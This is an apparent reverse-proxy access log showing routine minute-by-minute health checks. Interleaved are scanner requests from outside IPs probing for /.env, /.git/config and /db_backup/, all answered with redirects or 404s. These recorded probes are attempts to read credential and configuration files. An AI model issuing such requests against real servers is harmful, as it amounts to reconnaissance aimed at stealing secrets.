159.203.109.206 - - [18/Dec/2023:06:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4285 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:06:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4286 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:06:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4287 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:06:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4288 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:06:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4289 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:06:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4290 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:06:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4291 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:06:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4292 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:06:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4293 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:06:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4294 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:07:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4295 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:07:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4296 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [18/Dec/2023:07:01:07 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4297 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [18/Dec/2023:07:01:07 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4298 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:07:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4299 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4300 "www@docker" "http://172.18.0.9:80" 0ms
198.235.24.254 - - [18/Dec/2023:07:01:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4301 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:07:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4302 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:07:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4303 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4304 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4305 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:07:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4306 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:07:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4307 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4308 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4309 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4310 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4311 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4312 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4313 "www@docker" "http://172.18.0.9:80" 0ms
167.94.138.33 - - [18/Dec/2023:07:08:14 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4314 "web-to-websecure@internal" "-" 0ms
167.94.138.33 - - [18/Dec/2023:07:08:17 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4315 "web-to-websecure@internal" "-" 0ms
167.94.138.33 - - [18/Dec/2023:07:08:20 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4316 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:07:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4317 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4318 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:07:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4319 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4320 "www@docker" "http://172.18.0.9:80" 0ms
167.94.138.33 - - [18/Dec/2023:07:10:03 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4321 "-" "-" 0ms
167.94.138.33 - - [18/Dec/2023:07:10:06 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4322 "-" "-" 0ms
103.203.57.1 - - [18/Dec/2023:07:10:07 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4323 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:07:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4324 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4325 "www@docker" "http://172.18.0.9:80" 0ms
185.224.128.142 - - [18/Dec/2023:07:10:47 +0000] "GET /db_backup/ HTTP/1.1" 404 19 "-" "-" 4326 "-" "-" 0ms
185.224.128.142 - - [18/Dec/2023:07:10:47 +0000] "GET /db_backup/ HTTP/1.1" 301 17 "-" "-" 4327 "web-to-websecure@internal" "-" 0ms
185.224.128.142 - - [18/Dec/2023:07:10:48 +0000] "GET /db_backup/ HTTP/1.1" 404 19 "-" "-" 4328 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:07:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4329 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4330 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4331 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:07:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4332 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4333 "www@docker" "http://172.18.0.9:80" 1ms
205.210.31.178 - - [18/Dec/2023:07:13:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4334 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:07:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4335 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4336 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4337 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:07:15:14 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4338 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:07:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4339 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4340 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4341 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4342 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4343 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:07:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4344 "www@docker" "http://172.18.0.9:80" 0ms
91.92.243.232 - - [18/Dec/2023:07:18:16 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4345 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:07:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4346 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4347 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4348 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:07:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4349 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:07:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4350 "www@docker" "http://172.18.0.9:80" 0ms
57.129.23.166 - - [18/Dec/2023:07:20:27 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4351 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [18/Dec/2023:07:20:27 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4352 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:07:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4353 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:07:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4354 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4355 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4356 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4357 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:07:23:03 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4358 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:07:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4359 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4360 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:07:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4361 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4362 "www@docker" "http://172.18.0.9:80" 1ms
45.33.87.154 - - [18/Dec/2023:07:24:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4363 "-" "-" 0ms
45.79.181.251 - - [18/Dec/2023:07:25:01 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4364 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:07:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4365 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4366 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4367 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4368 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:07:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4369 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4370 "www@docker" "http://172.18.0.9:80" 0ms
167.94.145.52 - - [18/Dec/2023:07:27:56 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4371 "-" "-" 0ms
167.94.145.52 - - [18/Dec/2023:07:27:59 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4372 "-" "-" 0ms
45.33.87.154 - - [18/Dec/2023:07:28:03 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4373 "-" "-" 0ms
172.104.11.4 - - [18/Dec/2023:07:28:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4374 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:07:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4375 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4376 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4377 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4378 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4379 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4380 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4381 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4382 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:07:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4383 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4384 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4385 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4386 "www@docker" "http://172.18.0.9:80" 0ms
45.33.87.154 - - [18/Dec/2023:07:34:13 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4387 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:07:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4388 "www@docker" "http://172.18.0.9:80" 0ms
192.155.90.220 - - [18/Dec/2023:07:34:23 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4389 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:07:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4390 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4391 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:07:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4392 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:07:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4393 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4394 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4395 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4396 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:07:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4397 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:07:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4398 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4399 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4400 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4401 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4402 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:07:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4403 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:07:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4404 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4405 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4406 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4407 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4408 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4409 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:07:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4410 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4411 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4412 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:07:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4413 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:07:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4414 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4415 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4416 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4417 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:07:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4418 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4419 "www@docker" "http://172.18.0.9:80" 0ms
198.74.56.46 - - [18/Dec/2023:07:49:28 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4420 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:07:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4421 "www@docker" "http://172.18.0.9:80" 0ms
172.104.11.4 - - [18/Dec/2023:07:49:44 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 4422 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:07:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4423 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4424 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4425 "www@docker" "http://172.18.0.9:80" 1ms
170.64.186.169 - - [18/Dec/2023:07:51:26 +0000] "GET /.git/config HTTP/1.1" 301 17 "-" "-" 4426 "web-to-websecure@internal" "-" 0ms
170.64.186.169 - - [18/Dec/2023:07:51:27 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 4427 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:07:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4428 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:07:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4429 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4430 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4431 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4432 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4433 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4434 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4435 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:07:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4436 "www@docker" "http://172.18.0.9:80" 1ms
142.44.176.65 - - [18/Dec/2023:07:56:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 4437 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:07:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4438 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:07:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4439 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4440 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4441 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:07:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4442 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:07:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4443 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:07:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4444 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:07:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4445 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4446 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4447 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4448 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4449 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4450 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4451 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4452 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4453 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4454 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4455 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4456 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:08:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4457 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4458 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:08:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4459 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4460 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4461 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4462 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:08:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4463 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:08:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4464 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:08:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4465 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:08:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4466 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [18/Dec/2023:08:10:23 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 4467 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [18/Dec/2023:08:10:23 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 4468 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:08:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 4469 "www@docker" "http://172.18.0.9:80" 0ms
